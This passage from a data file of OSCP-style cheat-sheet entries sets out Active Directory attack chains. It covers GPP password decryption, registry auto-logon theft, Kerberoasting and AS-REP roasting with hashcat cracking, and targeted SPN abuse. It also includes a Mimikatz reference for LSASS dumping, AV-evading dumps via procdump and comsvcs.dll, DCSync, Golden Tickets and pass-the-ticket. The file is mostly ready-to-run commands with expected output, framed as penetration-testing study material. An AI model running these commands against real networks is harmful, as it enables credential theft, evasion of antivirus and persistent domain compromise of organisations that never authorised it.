You now have local admin on 200+ machines. Use this credential with PsExec, WinRM, or RDP for lateral movement. This is a critical finding - instant domain-wide local admin access."", ""why_this_works"": ""Group Policy Preferences (introduced in Server 2008) allowed setting passwords via GPO (local admin password, scheduled task credentials, service accounts). Microsoft stored these passwords AES-256 encrypted in SYSVOL. PROBLEM: They published the AES key on MSDN for backward compatibility. MS14-025 (2014) deprecated this feature but SYSVOL isn't automatically cleaned - old GPP files persist for years. Any authenticated user can read SYSVOL, download Groups.xml, and decrypt with the published key.""}, {""title"": ""Scenario 5: Remote Registry Enumeration for Auto-Logon Credentials"", ""context"": ""You have local admin on 'WORKSTATION05' (found via Find-LocalAdminAccess). You want to check if auto-logon is enabled - this stores plaintext credentials in the registry (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon). Use remote registry access to read these keys without interactive login."", ""approach"": ""Use Get-RemoteLocalAccountMember or manual reg.exe to query remote registry. Auto-logon credentials stored in: DefaultUserName, DefaultPassword (plaintext!), DefaultDomainName. If auto-logon is enabled, you get free credentials. Also check: stored RDP credentials (Credential Manager), cached domain credentials (SECURITY\\Cache)."", ""commands"": [""powerview-get-netsession""], ""expected_outcome"": ""Remote registry query (reg query \\\\WORKSTATION05\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v DefaultPassword) returns: 'DefaultPassword REG_SZ P@ssw0rd123', 'DefaultUserName REG_SZ admin', 'DefaultDomainName REG_SZ CORP'. Auto-logon is enabled - you have domain credentials (corp\\admin:P@ssw0rd123). Test these credentials elsewhere - 'admin' might be a privileged account."", ""why_this_works"": ""Auto-logon feature (enabled via Sysprep or manual registry edit) stores credentials in plaintext in HKLM. This is by design - Windows needs the password to perform automatic login at boot. Remote Registry service (disabled by default on modern Windows, enabled on older systems) allows remote access to registry hives. If you have local admin + Remote Registry enabled, you can query registry keys remotely. Auto-logon is common on: lab environments, kiosks, legacy servers with services that require interactive login.""}]","[{""title"": ""Phase 1: Session Enumeration (Who's Logged In Where?)"", ""notes"": ""Identify active user sessions across domain computers. Focus on privileged accounts (Domain Admins, service accounts). NetSessionEnum API restricted on modern Windows - expect failures on Server 2019+/Windows 11+. Fallback to Get-NetLoggedon (uses Remote Registry, also often blocked)."", ""commands"": [{""id"": ""powerview-get-netsession"", ""example"": ""Get-NetSession -ComputerName DC1.corp.com"", ""shows"": ""CName""}, {""id"": ""powerview-get-netloggedon"", ""example"": ""Get-NetLoggedon -ComputerName WEB04.corp.com"", ""shows"": ""UserName""}, {""id"": ""psloggedon"", ""example"": ""PsLoggedOn.exe \\\\WS01"", ""shows"": ""Users logged on locally""}]}, {""title"": ""Phase 2: Local Admin Access Mapping"", ""notes"": ""Test local admin access on all domain computers by attempting C$ share access. This identifies lateral movement targets where no exploit is needed. Also reveals delegation patterns (which accounts are local admin where)."", ""commands"": [{""id"": ""powerview-find-localadminaccess"", ""example"": ""Find-LocalAdminAccess"", ""shows"": ""Computer names where you have admin access""}]}, {""title"": ""Phase 3: Share Discovery & Enumeration"", ""notes"": ""Discover all SMB shares across domain computers. Prioritize: SYSVOL (GPP passwords), NETLOGON (scripts), user shares (credentials, keys), application shares (config files). Exclude default admin shares (C$, ADMIN$) unless testing local admin access."", ""commands"": [{""id"": ""powerview-find-domainshare"", ""example"": ""Find-DomainShare"", ""shows"": ""Name""}, {""id"": ""powerview-find-domainshare-exclude"", ""example"": ""Find-DomainShare -CheckShareAccess -ExcludeStandard"", ""shows"": ""ComputerName""}]}, {""title"": ""Phase 4: GPP Password Hunting"", ""notes"": ""Search SYSVOL for Groups.xml, ScheduledTasks.xml, Services.xml containing 'cpassword' attribute. These files contain AES-encrypted passwords that can be decrypted with published Microsoft key. Credential hunting in SYSVOL is OSCP exam staple."", ""commands"": [{""id"": ""gpp-password-files"", ""example"": ""findstr /S /I cpassword \\\\corp.com\\sysvol\\corp.com\\policies\\*.xml"", ""shows"": ""cpassword=""}, {""id"": ""gpp-password-decrypt"", ""example"": ""gpp-decrypt \""+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"""", ""shows"": ""Plaintext password displayed""}]}, {""title"": ""Phase 5: Credential Extraction from Shares"", ""notes"": ""Manual credential hunting in accessible shares. Search for: .xml (app configs), .ps1 (scripts with hardcoded creds), .txt (password notes), .config (web.config, appsettings.json), .rdp (saved RDP sessions), .kdbx (KeePass databases), id_rsa (SSH keys). Use PowerShell or manual dir /s /b *.config to recursively search."", ""commands"": [{""id"": ""powerview-find-domainshare"", ""example"": ""Find-DomainShare"", ""shows"": ""Name""}]}]"
"ad-service-account-hunting","Active Directory Service Account Hunting (Kerberoasting)","Identify and exploit service accounts with registered SPNs - request TGS tickets encrypted with service account password hash, crack offline for credentials","ACTIVE_DIRECTORY|KERBEROASTING|SPN|SERVICE_ACCOUNTS|PRIVILEGE_ESCALATION|OSCP:HIGH|QUICK_WIN","{""how_to_recognize"": [""You have domain user credentials (even low-privilege - any authenticated user can Kerberoast)"", ""Looking for privilege escalation vectors in Active Directory"", ""SPN enumeration reveals accounts with servicePrincipalName attribute"", ""Service accounts often have weak passwords (human-generated, 8-12 chars, never expire)""], ""when_to_look_for"": [""After initial domain reconnaissance completes"", ""When you have valid credentials but no admin access"", ""OSCP exam: Always check for Kerberoastable accounts on domain-joined machines"", ""Service accounts frequently have SeImpersonate, SQLAdmin, or local admin rights elsewhere""]}","[{""title"": ""Scenario 1: Discovery Phase - Identify Kerberoastable Accounts"", ""context"": ""You have domain user credentials (corp\\lowpriv) on a Windows 10 workstation. Initial recon showed 250+ domain users. You need to identify which accounts are Kerberoastable (have SPNs registered) before attempting ticket requests. Time-efficient filtering is critical."", ""approach"": ""Use setspn.exe (legacy) or PowerView (modern) to query Active Directory for all accounts with servicePrincipalName attribute set. Any domain user can read this attribute - no special permissions required. Focus on user accounts (not computer accounts - those have 120-char random passwords)."", ""commands"": [""setspn-list-user-spns"", ""impacket-getuserspns-list"", ""rubeus-kerberoast""], ""expected_outcome"": ""You'll discover 2-5 service accounts like 'sqlservice', 'iis_svc', 'backupuser' with SPNs like 'MSSQLSvc/db01.corp.com:1433'. These are your targets. Computer accounts (ending in $) can be ignored. Focus on human-managed service accounts - they typically have weak, static passwords."", ""why_this_works"": ""Active Directory stores SPNs as a multi-valued attribute (servicePrincipalName) on user objects. This attribute must be readable by all authenticated users for Kerberos authentication to function. When a client needs to access a service, it queries AD for the SPN to determine which account to request a ticket for. You're using the same mechanism, but for reconnaissance instead of legitimate access.""}, {""title"": ""Scenario 2: Modern Kerberoasting - Rubeus or impacket-GetUserSPNs"", ""context"": ""You're on Kali Linux with domain credentials (corp\\pete:Nexus123!) or have RDP access to Windows domain-joined system. You've identified 3 service accounts with SPNs (sql_service, iis_service, svc_backup). You want to extract TGS-REP hashes using modern tools for immediate offline cracking."", ""approach"": ""LINUX: Use impacket-GetUserSPNs with -request flag to enumerate SPNs AND extract TGS hashes in one command. Output is Hashcat mode 13100 compatible. WINDOWS: Use Rubeus.exe kerberoast to automatically find all SPNs on user accounts and extract hashes. Both methods are significantly faster than legacy PowerShell approaches."", ""commands"": [""impacket-getuserspns-kerberoast"", ""rubeus-kerberoast"", ""hashcat-crack-tgsrep""], ""expected_outcome"": ""LINUX OUTPUT: impacket-GetUserSPNs shows ServicePrincipalName, Name, MemberOf for each account. With -request flag, extracts TGS-REP hashes: $krb5tgs$23$*sql_service$CORP.COM$MSSQLSvc/db01*$abc123.... WINDOWS OUTPUT: Rubeus displays SamAccountName, DistinguishedName, ServicePrincipalName, Supported ETypes (RC4 vs AES), and hash output. Transfer hashes to Kali. CRACKING: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force cracks 2/3 hashes in 15 minutes: sql_service:MSSQLPassword123!, iis_service:IIS2019!. TIME ESTIMATE: Enumeration (10 sec) + hash extraction (10 sec) + transfer (30 sec) + cracking (5-60 min)."", ""why_this_works"": ""impacket-GetUserSPNs: Python-based tool using LDAP to enumerate SPNs, then Kerberos AS-REQ/TGS-REQ to obtain service tickets. Automatically formats output for Hashcat. Rubeus: C# .NET tool using native Windows Kerberos API (System.IdentityModel). Faster than PowerShell because it's compiled and uses direct API calls. BOTH TOOLS: Request TGS tickets for identified SPNs. TGS is encrypted with service account's Kerberos key (derived from password hash). Extract encrypted portion, crack offline with Hashcat. NO PERMISSION CHECKS: Kerberos allows ANY authenticated user to request TGS for ANY SPN. Permission checks only occur when USING the service, not when REQUESTING the ticket.""}, {""title"": ""Scenario 3: PowerView Automated Kerberoasting"", ""context"": ""You have PowerView loaded and identified 4 Kerberoastable accounts. You want to automate ticket request + extraction in a single command. Output should be hashcat-ready format for immediate offline cracking. This is the OSCP exam scenario - speed matters."", ""approach"": ""Use Invoke-Kerberoast PowerView function to automate the entire attack chain: SPN discovery, ticket request, ticket extraction, and hashcat format conversion. This is faster than manual PowerShell System.IdentityModel approach for multiple accounts."", ""commands"": [""powerview-kerberoast"", ""hashcat-crack-tgsrep""], ""expected_outcome"": ""Invoke-Kerberoast -OutputFormat Hashcat outputs TGS-REP hashes directly: $krb5tgs$23$*sqlservice$CORP.COM$MSSQLSvc/db01*$abc123... for each service account. Copy hashes to file, transfer to Kali, crack with Hashcat mode 13100. Expect 1-2 crackable hashes within 10-30 minutes depending on password complexity."", ""why_this_works"": ""PowerView Invoke-Kerberoast automates: (1) LDAP query for accounts with servicePrincipalName attribute. (2) TGS ticket request via System.IdentityModel.Tokens.KerberosRequestorSecurityToken. (3) Ticket extraction from memory. (4) Conversion to Hashcat format. Each TGS ticket is encrypted with the service account's Kerberos key. Since service accounts often have weak passwords (Password123, ServiceAccount2019!, company name + year), these hashes crack quickly with rule-based attacks.""}, {""title"": ""Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree"", ""context"": ""You've compromised a domain user account (corp\\jdoe:Password123!) and want to maximize credential access attacks against Active Directory. You're deciding between Kerberoasting (targeting SPNs) and AS-REP Roasting (targeting users with preauthentication disabled). Both attacks extract offline-crackable hashes, but target different account types. You want to understand which to prioritize and when to use each."", ""approach"": ""Run BOTH attacks in parallel - they target different misconfigurations and take <1 minute each to complete enumeration phase. Kerberoasting targets service accounts (common, 60-80% success rate in corporate domains). AS-REP roasting targets misconfigured user accounts (rare, <10% of domains, but when it exists often reveals privileged accounts). Decision matrix: (1) Kerberoasting: Always run first - higher success rate, targets service accounts which are often over-privileged. (2) AS-REP roasting: Run as second priority - lower success rate but fast (<30 seconds), may reveal admin accounts. (3) Both: Ideal approach - different attack surfaces, complementary techniques."", ""commands"": [""impacket-getuserspns-list"", ""impacket-getnpusers-identify"", ""impacket-getuserspns-kerberoast"", ""impacket-getnpusers-asreproast"", ""hashcat-crack-tgsrep"", ""hashcat-crack-asrep""], ""expected_outcome"": ""KERBEROASTING: Enumeration (impacket-GetUserSPNs without -request) finds 3 user SPNs: sql_service, iis_service, svc_backup. Request TGS (-request flag) extracts 3 hashes. Hashcat mode 13100 cracks 2/3 hashes: sql_service:SQLPassword123!, iis_service:IIS2019!. AS-REP ROASTING: Enumeration (impacket-GetNPUsers without -request) finds 1 vulnerable user: dave (standard user, no admin groups). Request AS-REP (-request flag) extracts hash. Hashcat mode 18200 cracks: dave:Flowers1. RESULT: 3 total cracked accounts (2 service accounts + 1 user). TIME ESTIMATE: Kerberoasting enum (10 sec) + request (10 sec) + crack (5-30 min). AS-REP enum (5 sec) + request (5 sec) + crack (1-30 min). Total: <60 minutes for complete credential access sweep."", ""why_this_works"": ""KERBEROASTING MECHANISM: ANY authenticated user can request TGS tickets for ANY SPN. TGS is encrypted with service account password hash. Service accounts often have weak passwords (human-chosen, never changed, 8-12 chars). TARGET: User accounts with servicePrincipalName attribute. UNCRACKABLE: Computer accounts (MACHINE$) have 120-char random passwords. AS-REP ROASTING MECHANISM: If Kerberos preauthentication is DISABLED (DONT_REQ_PREAUTH UAC flag), KDC will issue AS-REP without password verification. AS-REP contains encrypted data using user's password hash. TARGET: Users with preauthentication disabled (rare - DEFAULT is enabled). COMPLEMENTARY ATTACKS: Kerberoasting finds service account passwords. AS-REP roasting finds misconfigured user accounts. Different targets = different credentials. OSCP STRATEGY: Run both attacks early in domain assessment. Kerberoasting: High success rate, targets over-privileged service accounts. AS-REP roasting: Low success rate but extremely fast to check. DECISION MATRIX: [Found SPNs on user accounts?] \u2192 YES: Kerberoast (high priority). [Found users with DONT_REQ_PREAUTH?] \u2192 YES: AS-REP roast. [Found neither?] \u2192 Both techniques found nothing (expected in hardened environments). Proceed to: Password spraying, local privilege escalation, or lateral movement with existing credentials. TIME COMPARISON: Kerberoasting enum + crack = 10-60 min. AS-REP roasting enum + crack = 1-30 min. Running both sequentially = 11-90 min total. Running enumeration for both in parallel = <30 sec, then crack hashes together.""}, {""title"": ""Scenario 5: Targeted Kerberoasting with GenericWrite Permissions"", ""context"": ""You've compromised user corp\\alice and performed comprehensive AD enumeration. Standard Kerberoasting (impacket-GetUserSPNs) found 0 user accounts with SPNs - all services run as computer accounts (uncrackable 120-char passwords). However, ACL analysis (Get-DomainObjectAcl) shows alice has GenericWrite permissions on user corp\\bob. You want to perform TARGETED Kerberoasting: add fake SPN to bob's account, request TGS, crack password, then remove SPN to restore original state."", ""approach"": ""Use PowerView Set-DomainObject to add servicePrincipalName attribute to bob's account (requires GenericWrite or GenericAll). Add fake SPN like HTTP/fake.corp.com (hostname doesn't need to exist - AD doesn't validate). Request TGS ticket with Rubeus or impacket-GetUserSPNs (targets newly-added SPN). Extract and crack TGS-REP hash. CRITICAL: Remove SPN after obtaining hash to avoid leaving permanent modification. Document all changes for assessment report."", ""commands"": [""targeted-kerberoast-set"", ""rubeus-kerberoast"", ""impacket-getuserspns-kerberoast"", ""hashcat-crack-tgsrep"", ""targeted-kerberoast-cleanup""], ""expected_outcome"": ""PERMISSION VERIFICATION: Get-DomainObjectAcl -Identity bob shows alice has GenericWrite (ActiveDirectoryRights = GenericWrite). ADD SPN: Set-DomainObject -Identity bob -Set @{serviceprincipalname='HTTP/fake.corp.com'} succeeds. VERIFICATION: Get-DomainUser bob -Properties serviceprincipalname shows SPN added. REQUEST TGS: Rubeus.exe kerberoast finds bob's new SPN, extracts TGS-REP hash. OUTPUT: $krb5tgs$23$*bob$CORP.COM$HTTP/fake.corp.com*$abc123.... CRACK: hashcat -m 13100 hash.txt rockyou.txt -r best64.rule --force cracks hash in 15 minutes: bob:CompanyPassword2023!. CLEANUP: Set-DomainObject -Identity bob -Clear serviceprincipalname removes SPN. VERIFICATION: Get-DomainUser bob -Properties serviceprincipalname shows empty/null (SPN removed). TIME ESTIMATE: ACL enum (30 sec) + set SPN (5 sec) + request TGS (10 sec) + crack (5-120 min) + cleanup (5 sec)."", ""why_this_works"": ""TARGETED KERBEROASTING exploits: (1) GenericWrite/GenericAll permissions allow modifying user attributes including servicePrincipalName. (2) Kerberos protocol allows ANY SPN value - AD doesn't validate hostname existence. (3) TGS tickets encrypted with user's password hash regardless of SPN validity. ATTACK SCENARIO: Standard Kerberoasting finds 0 SPNs on user accounts (all services use computer accounts). However, you have write permissions on other users (common via delegated administration, service account management, or ACL misconfigurations). PERMISSION REQUIREMENTS: GenericWrite OR GenericAll on target user. GenericWrite allows modifying most attributes. GenericAll grants full control. COMMON SCENARIOS: (1) IT administrators have GenericWrite on service account OUs. (2) Help desk has GenericAll on standard user OU. (3) Group-based delegation (Account Operators can modify users). (4) Misconfigured ACLs (GenericAll on entire Users container). SPN FORMAT: servicePrincipalName attribute accepts any string in protocol/hostname format (HTTP/fake.corp.com, MSSQLSvc/test.local:1433, anything/anywhere). AD performs NO VALIDATION of hostname or service. CLEANUP CRITICAL: Modifications to production AD require: (1) Written authorization in assessment scope. (2) Immediate cleanup after hash extraction. (3) Documentation in report (before/after attribute values). (4) Client notification if cleanup fails. DETECTION: Event ID 4738 (user account changed) or 5136 (directory service object modified) shows servicePrincipalName modification. Blue team should alert on SPN additions to standard user accounts. ALTERNATIVE ATTACKS: If no GenericWrite, try: (1) Password reset (more obvious, locks user out). (2) AS-REP roasting with DONT_REQ_PREAUTH modification. (3) Group membership modification (requires different permissions).""}]","[{""title"": ""Phase 1: SPN Discovery"", ""notes"": ""Identify which accounts have SPNs registered. Focus on user accounts (not computer accounts). Any authenticated domain user can query this - no special permissions needed. RECOMMENDED TOOLS: Windows \u2192 setspn -Q */* OR Rubeus.exe kerberoast (shows SPNs). Linux \u2192 impacket-GetUserSPNs (no -request flag). FILTER OUT: Computer accounts (ending in $) have 120-character random passwords - uncrackable. Only target USER accounts with SPNs."", ""commands"": [{""id"": ""setspn-list-user-spns"", ""example"": ""setspn -Q */*"", ""shows"": ""CN=""}, {""id"": ""impacket-getuserspns-list"", ""example"": ""impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/meg:\""VimForPowerShell123!\"""", ""shows"": ""ServicePrincipalName""}, {""id"": ""rubeus-kerberoast"", ""example"": "".\\Rubeus.exe kerberoast /outfile:C:\\Tools\\hashes.kerberoast"", ""shows"": ""SamAccountName""}]}, {""title"": ""Phase 2: TGS Ticket Request and Hash Extraction"", ""notes"": ""Request TGS tickets for identified SPNs and extract hashes for offline cracking. LINUX: impacket-GetUserSPNs -request -outputfile hashes.kerberoast. WINDOWS: Rubeus.exe kerberoast /outfile:hashes.kerberoast. Both output Hashcat mode 13100 format. RC4 VS AES: Rubeus may show 'AES hashes will be returned' - use /tgtdeleg flag to force RC4 downgrade (10x faster to crack)."", ""commands"": [{""id"": ""impacket-getuserspns-kerberoast"", ""example"": ""impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:\""VimForPowerShell123!\"""", ""shows"": ""ServicePrincipalName""}, {""id"": ""rubeus-kerberoast"", ""example"": "".\\Rubeus.exe kerberoast /outfile:C:\\Tools\\hashes.kerberoast"", ""shows"": ""SamAccountName""}, {""id"": ""rubeus-kerberoast-aes"", ""example"": "".\\Rubeus.exe kerberoast /tgtdeleg /outfile:C:\\Tools\\hashes_rc4.kerberoast"", ""shows"": ""Supported ETypes       : RC4_HMAC_DEFAULT""}]}, {""title"": ""Phase 3: Offline Hash Cracking"", ""notes"": ""Crack TGS-REP hashes with Hashcat mode 13100. ATTACK STRATEGY: (1) Straight dictionary: hashcat -m 13100 hashes.kerberoast rockyou.txt --force (try first). (2) Rule-based: Add best64.rule for common mutations. (3) Targeted: Create custom wordlist from company name, service type, common patterns. TIME ESTIMATE: Weak password (dict word + number) = 5-30 min. Strong password (12+ random chars) = infeasible."", ""commands"": [{""id"": ""hashcat-crack-tgsrep"", ""example"": ""hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Cracked""}]}, {""title"": ""Phase 4: Credential Validation and Privilege Escalation"", ""notes"": ""Validate cracked service account credentials and check for privileges. VALIDATION: crackmapexec smb <DC_IP> -u service_account -p cracked_password -d domain.com. PRIVILEGE CHECK: net user service_account /domain (shows groups). LATERAL MOVEMENT: Service accounts often have: (1) Local admin on servers. (2) Domain admin membership (poor practice but common). (3) High-privilege groups (Backup Operators, Server Operators). (4) SeImpersonate token privileges."", ""commands"": [{""id"": ""crackmapexec-validate-admin"", ""example"": ""crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com"", ""shows"": ""[+]""}]}, {""title"": ""SPN Account Types and Crackability Quick Reference"", ""notes"": ""CRACKABLE ACCOUNTS (target these): (1) USER accounts with servicePrincipalName attribute (sql_service, iis_service, svc_backup). PASSWORD: Human-chosen, 8-14 chars typically, rarely changed. SUCCESS RATE: 60-80% in corporate domains. HASH FORMAT: $krb5tgs$23$ (RC4) or $krb5tgs$17$/$krb5tgs$18$ (AES). CRACKING TIME: 5-120 minutes with wordlist + rules. UNCRACKABLE ACCOUNTS (ignore these): (1) COMPUTER accounts (ending in $) - WEB01$, SQL-SERVER$, DC01$. PASSWORD: 120 characters, random, auto-rotated every 30 days. IMPOSSIBLE to crack. (2) MANAGED SERVICE ACCOUNTS (MSA) - objectClass = msDS-ManagedServiceAccount. PASSWORD: 120 characters, random, managed by AD. IMPOSSIBLE to crack. (3) GROUP MANAGED SERVICE ACCOUNTS (gMSA) - objectClass = msDS-GroupManagedServiceAccount. PASSWORD: 240 characters, random, managed by AD. IMPOSSIBLE to crack. IDENTIFICATION: Computer accounts have $ at end of sAMAccountName. MSA/gMSA have special objectClass. USER accounts have neither. OSCP TIP: If impacket-GetUserSPNs or Rubeus finds ONLY computer accounts (all names end in $), Kerberoasting attack surface is ZERO. Document finding and proceed to alternative attacks (AS-REP roasting, password spraying, local privilege escalation). FILTERING: grep -v '\\$@' hashes.kerberoast removes computer account hashes before cracking attempt."", ""commands"": [{""id"": ""setspn-list-user-spns"", ""example"": ""setspn -Q */*"", ""shows"": ""CN=""}, {""id"": ""impacket-getuserspns-list"", ""example"": ""impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/meg:\""VimForPowerShell123!\"""", ""shows"": ""ServicePrincipalName""}]}]"
"mimikatz-oscp-comprehensive","Mimikatz Comprehensive OSCP Cheatsheet","Complete mimikatz reference for OSCP exam covering credential harvesting, Kerberos attacks, and AV bypass alternatives. Includes Pass-the-Ticket, DCSync, Golden/Silver tickets, and offline parsing techniques.","MIMIKATZ|ACTIVE_DIRECTORY|CREDENTIAL_HARVESTING|OSCP:HIGH|METHODOLOGY|PASS_THE_TICKET|DCSYNC|GOLDEN_TICKET|KERBEROS|AV_EVASION","{""how_to_recognize"": [""You have local administrator access on Windows machine"", ""Need to extract credentials from LSASS memory or registry"", ""Domain Admin or privileged user has active session on compromised machine"", ""Want lateral movement with stolen credentials or Kerberos tickets"", ""Need persistence in Active Directory environment after domain compromise""], ""when_to_look_for"": [""Immediately after gaining local admin on ANY Windows system in domain"", ""When you need Domain Admin credentials for privilege escalation"", ""After discovering service account with high privileges logged in"", ""When DCSync succeeds - create Golden Ticket with krbtgt hash for persistence"", ""For establishing persistent domain-wide access without password dependencies""]}","[{""title"": ""Scenario 1: Initial Foothold - Harvest Credentials from Memory"", ""context"": ""Gained local admin via web exploit. Need DA credentials for privilege escalation."", ""approach"": ""Enable SeDebugPrivilege, dump LSASS memory, extract NTLM hashes and plaintext passwords from active sessions."", ""commands"": [""mimikatz-privilege-debug"", ""mimikatz-sekurlsa-logonpasswords""], ""expected_outcome"": ""NTLM hashes for domain users with active sessions. Service accounts often contain Domain Admin credentials."", ""why_this_works"": ""LSASS caches credentials for SSO. Service sessions persist even without interactive logons.""}, {""title"": ""Scenario 2: AV Bypass - Offline Extraction When Defender Blocks Mimikatz"", ""context"": ""Windows Defender enabled, blocks Mimikatz.exe execution. Need credentials without AV detection."", ""approach"": ""Dump LSASS with procdump or comsvcs.dll (Microsoft-signed), transfer dump to Kali, parse offline with pypykatz."", ""commands"": [""procdump-lsass-dump"", ""comsvcs-lsass-dump"", ""pypykatz-parse-lsass""], ""expected_outcome"": ""Same credentials as direct Mimikatz without on-target AV alerts. 100% offline parsing on Kali."", ""why_this_works"": ""Procdump/comsvcs are legitimate Microsoft tools (no AV signatures). Offline parsing eliminates on-target Mimikatz execution.""}, {""title"": ""Scenario 3: DCSync to Golden Ticket - Persistent Domain Access"", ""context"": ""Obtained DA credentials. Want persistent access that survives password changes."", ""approach"": ""Extract krbtgt hash via DCSync, create Golden Ticket valid for 10 years, inject for domain-wide access."", ""commands"": [""ad-dcsync-mimikatz-krbtgt"", ""mimikatz-kerberos-purge"", ""mimikatz-kerberos-ptt""], ""expected_outcome"": ""Golden Ticket valid for 10 years. Access ANY domain resource as any user without passwords."", ""why_this_works"": ""krbtgt hash rarely changes (only on domain functional level upgrades). Forged TGT is cryptographically valid to all domain systems.""}, {""title"": ""Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets"", ""context"": ""Exported tickets from compromised workstation where DA logged in. Want to use DA ticket for lateral movement."", ""approach"": ""Export tickets from LSASS memory, purge existing tickets to avoid conflicts, inject DA TGT into current session."", ""commands"": [""mimikatz-sekurlsa-tickets-export"", ""mimikatz-kerberos-purge"", ""mimikatz-kerberos-ptt"", ""mimikatz-kerberos-list""], ""expected_outcome"": ""Authenticate as Domain Admin using stolen ticket without knowing password or hash."", ""why_this_works"": ""Kerberos tickets can be exported and reused. Windows accepts valid TGT for any service authentication.""}, {""title"": ""Scenario 5: Registry Dumps - Credential Guard Blocks LSASS Access"", ""context"": ""LSASS protected by Credential Guard. Memory-based extraction fails."", ""approach"": ""Extract credentials from registry (SAM for local accounts, LSA Secrets for services, Cache for domain users)."", ""commands"": [""mimikatz-lsadump-sam"", ""mimikatz-lsadump-secrets"", ""mimikatz-lsadump-cache""], ""expected_outcome"": ""Local admin hashes from SAM, service account passwords from LSA Secrets, domain cached credentials for offline cracking."", ""why_this_works"": ""Registry-based credentials persist on disk. Alternative when LSASS memory protected or no active sessions.""}]","[{""title"": ""Phase 1: Prerequisites & Upload"", ""notes"": ""Upload Mimikatz or alternatives, verify privileges before credential extraction."", ""commands"": [{""id"": ""mimikatz-privilege-debug"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""exit\"""", ""shows"": ""Privilege '20' OK (SeDebugPrivilege enabled)""}]}, {""title"": ""Phase 2: LSASS Memory Credential Extraction"", ""notes"": ""Primary method: Extract credentials from LSASS process memory. Provides NTLM hashes, plaintext passwords (if cached), and Kerberos tickets."", ""commands"": [{""id"": ""mimikatz-sekurlsa-logonpasswords"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""sekurlsa::logonpasswords\"" \""exit\"""", ""shows"": ""User Name: admin, Domain: CORP, NTLM: 8846f7ea...""}, {""id"": ""mimikatz-sekurlsa-tickets-export"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""sekurlsa::tickets /export\"" \""exit\"""", ""shows"": ""Saved to file: [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.kirbi""}]}, {""title"": ""Phase 3: AV Bypass - Alternative LSASS Extraction Methods"", ""notes"": ""When Mimikatz.exe blocked by AV: Use procdump (Microsoft-signed) or comsvcs.dll (built-in). Dump LSASS memory, download to Kali, parse offline with pypykatz."", ""commands"": [{""id"": ""procdump-lsass-dump"", ""example"": "".\\procdump64.exe -accepteula -ma lsass.exe lsass.dmp"", ""shows"": ""Dump 1 complete: 156 MB written in 8.2 seconds""}, {""id"": ""comsvcs-lsass-dump"", ""example"": ""rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Temp\\lsass.dmp full"", ""shows"": ""No output (silent success, verify file created)""}, {""id"": ""pypykatz-parse-lsass"", ""example"": ""pypykatz lsa minidump lsass.dmp"", ""shows"": ""username admin, NT: 8846f7eaee8fb117ad06bdd830b7586c""}]}, {""title"": ""Phase 4: Registry-Based Credential Dumps"", ""notes"": ""Alternative to LSASS memory when Credential Guard enabled or no active sessions. SAM = local accounts, Secrets = service passwords/autologon, Cache = domain cached credentials."", ""commands"": [{""id"": ""mimikatz-lsadump-sam"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""token::elevate\"" \""lsadump::sam\"" \""exit\"""", ""shows"": ""RID: 000001f4 (500), User: Administrator, NTLM: aad3b435...""}, {""id"": ""mimikatz-lsadump-secrets"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""token::elevate\"" \""lsadump::secrets\"" \""exit\"""", ""shows"": ""Secret: _SC_MSSQLSERVER, text: P@ssw0rd123!""}, {""id"": ""mimikatz-lsadump-cache"", ""example"": "".\\mimikatz.exe \""privilege::debug\"" \""token::elevate\"" \""lsadump::cache\"" \""exit\"""", ""shows"": ""User: jdoe, MsCacheV2: e2d81a7f8b9c... (hashcat mode 2100)""}]}, {""title"": ""Phase 5: Kerberos Ticket Manipulation"", ""notes"": ""List tickets to verify injection, inject tickets for Pass-the-Ticket attacks, purge tickets for cleanup or to avoid conflicts."", ""commands"": [{""id"": ""mimikatz-kerberos-list"", ""example"": "".\\mimikatz.exe \""kerberos::list\"" \""exit\"""", ""shows"": ""Server Name: krbtgt/CORP.COM, Client: admin@CORP.COM""}, {""id"": ""mimikatz-kerberos-ptt"", ""example"": "".\\mimikatz.exe \""kerberos::ptt admin.kirbi\"" \""exit\"""", ""shows"": ""Injecting ticket: OK""}, {""id"": ""mimikatz-kerberos-purge"", ""example"": "".\\mimikatz.exe \""kerberos::purge\"" \""exit\"""", ""shows"": ""Ticket(s) purge for current session is OK""}]}, {""title"": ""Phase 6: DCSync Attack - Remote Credential Dumping"", ""notes"": ""Requires Domain Admin or equivalent replication privileges. Extract password hashes remotely from Domain Controller without logging in."", ""commands"": [{""id"": ""ad-dcsync-mimikatz-krbtgt"", ""example"": ""mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt"", ""shows"": ""User: krbtgt, NTLM: 1693c6cefafffc7af11ef34d1c788f47""}]}, {""title"": ""Phase 7: Golden/Silver Ticket Creation - Kerberos Persistence"", ""notes"": ""Golden Ticket (TGT) = domain-wide access with krbtgt hash. Silver Ticket (TGS) = service-specific access with service account hash. Both provide persistence."", ""commands"": []}, {""title"": ""Phase 8: Cleanup & OPSEC"", ""notes"": ""Remove artifacts, purge injected tickets, delete dump files. Minimize forensic footprint."", ""commands"": [{""id"": ""mimikatz-kerberos-purge"", ""example"": "".\\mimikatz.exe \""kerberos::purge\"" \""exit\"""", ""shows"": ""Ticket(s) purge for current session is OK""}]}]"
